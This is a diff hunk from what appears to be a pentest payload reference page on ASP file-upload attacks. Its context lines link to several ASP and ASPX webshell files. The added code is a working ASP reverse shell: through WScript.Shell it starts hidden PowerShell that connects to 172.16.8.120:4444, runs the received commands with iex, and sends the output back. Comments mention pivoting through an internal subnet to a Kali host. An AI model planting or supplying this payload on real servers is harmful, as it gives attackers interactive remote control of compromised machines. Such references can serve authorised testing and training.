@@ -178,6 +178,19 @@ public class AverageHandler : IHttpHandler
 
 See [shell.asa](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asa "shell.asa"), [shell.asmx](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asmx "shell.asmx"), [shell.asp](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.asp "shell.asp"), [shell.aspx](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.aspx "shell.aspx"), [shell.cer](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.cer "shell.cer"), [shell.soap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.soap "shell.soap"), [shell.xamlx](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.xamlx "shell.xamlx").
 
+Also:
+
+```asp
+<%
+Dim command, shell, ip, port
+ip = "172.16.8.120"   ' <-- Pivot IP inside 172.16.8.0/24
+port = 4444           ' <-- Port forwarded from pivot to Kali
+
+Set shell = CreateObject("WScript.Shell")
+Set command = shell.Exec("cmd.exe /c powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('" & ip & "'," & port & ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($r,0,$r.Length);$s.Flush()}""")
+%>
+```
+
 
 
 ## netcat
